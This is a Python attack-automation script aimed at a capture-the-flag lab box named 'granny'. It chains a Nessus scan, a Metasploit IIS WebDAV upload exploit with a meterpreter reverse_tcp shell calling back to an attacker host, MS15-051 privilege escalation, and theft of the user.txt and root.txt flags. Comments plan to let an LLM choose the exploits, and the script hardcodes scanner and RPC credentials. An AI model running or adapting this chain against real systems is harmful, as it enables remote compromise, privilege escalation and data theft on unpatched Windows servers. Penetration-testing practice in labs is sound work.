from attack_executor.scan.nessus_scanning import NessusScanner
from attack_executor.scan.nessus_parser import NessusExploitParser
from attack_executor.exploit.Metasploit import MetasploitExecutor



# Action 0: Set up the environment
# Box settings
BOXNAME = "granny" 
RHOST = "10.10.10.15"
LHOST = "10.10.14.12"
LPORT = "4447"
FILE_NAMES = ["user.txt", "root.txt"]
 
# Nessus settings
NESSUS_SERVER = "https://localhost:15858"
USERNAME = "root"
PASSWORD = "root"
OUTPUT_DIR = "nessus_raw_data"

# Metasploit settings
MSF_PASSWORD = 'glycNshR'
MSF_SERVER = '127.0.0.1'
MSF_PORT = 55552



# Action 1: Scan the target
try:
    scanner = NessusScanner(NESSUS_SERVER, USERNAME, PASSWORD)
    output_file = scanner.perform_complete_scan(RHOST, boxname=BOXNAME, output_dir=OUTPUT_DIR)
    
    if output_file:
        print(f"\n[SUCCESS] Raw scan data saved to: {output_file}")
    
    scanner.logout()
            
except Exception as e:
    print(f"[!] Error: {e}")
    import traceback
    traceback.print_exc()

# Action 2: Analyze the scan data
parser = NessusExploitParser(output_file)
    
# Perform analysis
saved_files = parser.analyze_raw_data(OUTPUT_DIR)

if saved_files:
    print(f"\n[SUCCESS] Analysis completed successfully!")
    print(f"[FILES] Generated files:")
    for file_type, filepath in saved_files.items():
        print(f"  - {file_type.title()}: {filepath}")
else:
    print(f"\n[INFO] No vulnerabilities with exploit frameworks found in the scan data.")

# Action 3: Exploit the target after getting the exploit framework from LLM analysis
metasploit_executor = MetasploitExecutor(MSF_PASSWORD, MSF_SERVER, MSF_PORT)

metasploit_executor.set_exploit_module("windows/iis/iis_webdav_upload_asp", RHOST)
metasploit_executor.set_payload_module("windows/meterpreter/reverse_tcp", LHOST, LPORT)

# Action 4: Execute the exploit
print("[*] Using console-based execution for better stability...")
initial_session = metasploit_executor.run_console_based()

if initial_session:
    print(f"[+] Initial exploitation successful! Session: {initial_session}")
    
    # Check initial privileges
    print("\n[*] Checking initial privileges...")
    metasploit_executor.check_privileges(initial_session)
    
    # Will implement a LLM suggester for migration in future
    # Migrate to a more stable process using smart migration
    # print("\n[*] Attempting smart migration to stable process...")
    # migration_success = metasploit_executor.smart_migrate(initial_session)

    # Manual migration - let user choose PID
    print("\n[*] Getting process list for manual migration...\n smart migration will be implemented in future")
    metasploit_executor.ps(initial_session)
    

    
    while True:
        try:
            chosen_pid = input("\nEnter PID to migrate to (or 'skip' to continue without migration): ").strip()
            
            if chosen_pid.lower() == 'skip':
                print("[*] Skipping migration")
                break
            elif chosen_pid.isdigit():
                print(f"[*] Attempting to migrate to PID {chosen_pid}...")
                migration_result = metasploit_executor.migrate_process(chosen_pid, initial_session)
                if migration_result and "Migration completed successfully" in str(migration_result):
                    print(f"[+] Successfully migrated to PID {chosen_pid}")
                else:
                    print(f"[-] Migration to PID {chosen_pid} failed: {migration_result}")
                    retry = input("Try another PID? (y/n): ").strip().lower()
                    if retry != 'y':
                        break
                    continue
                break
            else:
                print("[!] Invalid input. Please enter a valid PID number or 'skip'")
        except KeyboardInterrupt:
            print("\n[*] Migration cancelled")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
    
    # Action 5: Privilege Escalation
    print("\n[*] Starting privilege escalation...")
    
    # Run local exploit suggester
    print("\n[*] Running local exploit suggester...")
    suggester_result = metasploit_executor.run_local_exploit_suggester(initial_session)
    
    if suggester_result:
        print(f"[+] Exploit suggester execution result: {suggester_result}")
    else:
        print("[-] Exploit suggester may have failed or completed without visible results")
    
    # parse the result of the local exploit suggester to LLM to find the optimal exploit
    print("The selection of the exploit using LLM will be implemented in future or we can enumerate all exploit possible")
    print("\n[*] Attempting privilege escalation with ms15_051_client_copy_image using console-based method...")
    
    # Use console-based local exploit directly
    privileged_session = metasploit_executor.run_local_exploit_console(
        "windows/local/ms15_051_client_copy_image", 
        session_id=initial_session,
        lhost=LHOST,
        lport="4444"  # Different port for the new session
    )
    
    if privileged_session:
        print(f"[+] Privilege escalation successful! New session: {privileged_session}")
        
        # Check new privileges
        print("\n[*] Checking escalated privileges...")
        metasploit_executor.check_privileges(privileged_session)
        
        # Use the privileged session for flag retrieval
        target_session = privileged_session
    else:
        print("[-] Privilege escalation failed, continuing with initial session...")
        target_session = initial_session
        
else:
    print("[-] Initial exploitation failed!")
    print("[!] Both standard and console-based execution failed. Check:")
    print("    - Target is reachable: ping 10.10.10.14")
    print("    - Metasploit RPC is running: netstat -ln | grep 55552")
    print("    - No firewall blocking connections")
    exit(1)

# Action 6: Get the flag
print("\n[*] Searching for flags...")
for file in FILE_NAMES:
    print(f"\n[*] Finding {file}")
    file_loc = metasploit_executor.communicate_with_meterpreter_session(
        input_text=f"search -f {file}",
        session_id=target_session
    )
    print(f"[*] Search results for {file}:")
    print(file_loc)
    
    file_name = metasploit_executor.extract_filename(file_loc)
    if file_name:
        print(f"[*] Found file at: {file_name}")
        file_content = metasploit_executor.communicate_with_meterpreter_session(
            input_text=f"cat '{file_name}'",
            session_id=target_session
        )
        print(f"\n[+] Content of {file}:")
        print(file_content)
    else:
        print(f"[-] Could not find {file}")

print("\n[+] Attack completed!")

